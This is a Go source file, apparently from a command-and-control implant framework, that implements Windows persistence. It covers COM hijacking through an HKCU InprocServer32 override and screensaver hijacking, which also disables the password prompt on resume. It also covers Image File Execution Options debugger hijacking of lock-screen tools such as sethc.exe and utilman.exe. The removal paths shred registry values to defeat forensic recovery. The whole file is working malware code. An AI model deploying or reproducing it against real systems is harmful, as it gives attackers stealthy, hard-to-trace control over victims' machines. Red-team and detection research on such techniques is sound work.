//go:build windows
// +build windows

// persist_methods.go implements COM hijack, screensaver, and IFEO persistence
// methods for Windows. Core command routing is in persist.go.

package commands

import (
	"fmt"
	"os"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

// defaultCLSID is MruPidlList — loaded by explorer.exe at shell startup, highly reliable.
const defaultCLSID = "{42aedc87-2188-41fd-b9a3-0c966feabec1}"

// persistCOMHijack installs/removes COM hijacking persistence via HKCU InprocServer32 override
func persistCOMHijack(args persistArgs) structs.CommandResult {
	if args.Path == "" && args.Action == "install" {
		exe, err := os.Executable()
		if err != nil {
			return errorf("Error getting executable path: %v", err)
		}
		args.Path = exe
	}

	clsid := args.CLSID
	if clsid == "" {
		clsid = defaultCLSID
	}
	// Normalize CLSID — ensure it has braces
	if !strings.HasPrefix(clsid, "{") {
		clsid = "{" + clsid + "}"
	}

	keyPath := fmt.Sprintf(`Software\Classes\CLSID\%s\InprocServer32`, clsid)

	switch strings.ToLower(args.Action) {
	case "install":
		key, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE)
		if err != nil {
			return errorf("Error creating HKCU\\%s: %v", keyPath, err)
		}
		defer key.Close()

		// Set (Default) value to our DLL/EXE path
		if err := key.SetStringValue("", args.Path); err != nil {
			return errorf("Error setting DLL path: %v", err)
		}

		// Set ThreadingModel (required for InprocServer32 to be used)
		if err := key.SetStringValue("ThreadingModel", "Both"); err != nil {
			return errorf("Error setting ThreadingModel: %v", err)
		}

		return successf("Installed COM hijack persistence:\n  CLSID:          %s\n  Key:            HKCU\\%s\n  DLL/EXE:        %s\n  ThreadingModel: Both\n  Trigger:        Loaded by explorer.exe at user logon", clsid, keyPath, args.Path)

	case "remove":
		// Shred values then delete InprocServer32 key, then the CLSID key
		shredRegistryKey(registry.CURRENT_USER, keyPath)

		parentPath := fmt.Sprintf(`Software\Classes\CLSID\%s`, clsid)
		// Best-effort cleanup of the parent CLSID key (may fail if it has other subkeys)
		_ = registry.DeleteKey(registry.CURRENT_USER, parentPath)

		return successf("Removed COM hijack persistence (shredded):\n  CLSID: %s\n  Key:   HKCU\\%s", clsid, keyPath)

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}

// persistScreensaver installs/removes screensaver hijacking persistence
func persistScreensaver(args persistArgs) structs.CommandResult {
	desktopKeyPath := `Control Panel\Desktop`

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			exe, err := os.Executable()
			if err != nil {
				return errorf("Error getting executable path: %v", err)
			}
			args.Path = exe
		}

		timeout := args.Timeout
		if timeout == "" {
			timeout = "60" // 60 seconds idle before screensaver triggers
		}

		key, err := registry.OpenKey(registry.CURRENT_USER, desktopKeyPath, registry.SET_VALUE)
		if err != nil {
			return errorf("Error opening HKCU\\%s: %v", desktopKeyPath, err)
		}
		defer key.Close()

		// Set SCRNSAVE.EXE to our payload
		if err := key.SetStringValue("SCRNSAVE.EXE", args.Path); err != nil {
			return errorf("Error setting SCRNSAVE.EXE: %v", err)
		}

		// Enable screensaver
		if err := key.SetStringValue("ScreenSaveActive", "1"); err != nil {
			return errorf("Error setting ScreenSaveActive: %v", err)
		}

		// Set idle timeout
		if err := key.SetStringValue("ScreenSaveTimeout", timeout); err != nil {
			return errorf("Error setting ScreenSaveTimeout: %v", err)
		}

		// Disable password on resume (avoids locking user out)
		if err := key.SetStringValue("ScreenSaverIsSecure", "0"); err != nil {
			return errorf("Error setting ScreenSaverIsSecure: %v", err)
		}

		return successf("Installed screensaver persistence:\n  Key:      HKCU\\%s\n  Payload:  %s\n  Timeout:  %s seconds\n  Secure:   No (no password on resume)\n  Trigger:  User idle for %s seconds → winlogon.exe launches payload", desktopKeyPath, args.Path, timeout, timeout)

	case "remove":
		key, err := registry.OpenKey(registry.CURRENT_USER, desktopKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			return errorf("Error opening HKCU\\%s: %v", desktopKeyPath, err)
		}
		defer key.Close()

		// Shred the screensaver executable path before deletion
		shredRegistryValue(key, "SCRNSAVE.EXE")
		// Disable screensaver
		_ = key.SetStringValue("ScreenSaveActive", "0")

		return successf("Removed screensaver persistence (shredded):\n  Shredded SCRNSAVE.EXE value\n  Disabled screensaver (ScreenSaveActive = 0)")

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}

// ifeoTargets are common IFEO targets accessible from the Windows lock screen.
var ifeoTargets = [][2]string{
	{"sethc.exe", "Sticky Keys (5x Shift at lock screen)"},
	{"utilman.exe", "Ease of Access (lock screen button)"},
	{"osk.exe", "On-Screen Keyboard"},
	{"narrator.exe", "Narrator"},
	{"magnify.exe", "Magnifier"},
}

// persistIFEO installs/removes Image File Execution Options debugger persistence (T1546.012).
func persistIFEO(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: name is required (target executable, e.g., sethc.exe, utilman.exe, osk.exe)")
	}

	ifeoBasePath := `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
	keyPath := ifeoBasePath + `\` + args.Name

	switch strings.ToLower(args.Action) {
	case "install":
		if args.Path == "" {
			exe, err := os.Executable()
			if err != nil {
				return errorf("Error getting executable path: %v", err)
			}
			args.Path = exe
		}

		key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE)
		if err != nil {
			return errorf("Error creating HKLM\\%s: %v (admin required)", keyPath, err)
		}
		defer key.Close()

		if err := key.SetStringValue("Debugger", args.Path); err != nil {
			return errorf("Error setting Debugger value: %v", err)
		}

		// Identify the trigger for display
		trigger := "When " + args.Name + " is launched"
		for _, t := range ifeoTargets {
			if strings.EqualFold(args.Name, t[0]) {
				trigger = t[1]
				break
			}
		}

		return successf("Installed IFEO persistence:\n  Key:      HKLM\\%s\n  Debugger: %s\n  Trigger:  %s\n  Note:     Requires admin. Target exe passes as first argument to debugger.", keyPath, args.Path, trigger)

	case "remove":
		key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			return errorf("Error opening HKLM\\%s: %v", keyPath, err)
		}
		defer key.Close()

		// Shred Debugger value before deletion to defeat forensic recovery
		shredRegistryValue(key, "Debugger")

		return successf("Removed IFEO persistence (shredded):\n  Key:    HKLM\\%s\n  Shredded Debugger value", keyPath)

	default:
		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
	}
}
